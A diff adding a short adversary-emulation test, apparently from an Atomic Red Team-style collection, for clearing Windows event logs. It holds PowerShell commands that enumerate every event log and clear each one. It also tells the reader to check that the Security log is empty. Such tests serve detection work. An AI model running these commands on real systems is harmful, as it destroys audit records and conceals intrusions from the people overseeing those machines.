@@ -1,0 +1,10 @@
+#TechniqueName: Indicator Removal on Host: Clear Windows Event Logs
+#AtomicTestName: Delete System Logs Using Clear-EventLog
+#Description: Clear event logs using built-in PowerShell commands.&Upon successful execution, you should see the list of deleted event logs&Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.&
+#Language: ps1
+
+#commands
+$logs = Get-EventLog -List | ForEach-Object {$_.Log}
+$logs | ForEach-Object {Clear-EventLog -LogName $_ }
+Get-EventLog -list
+
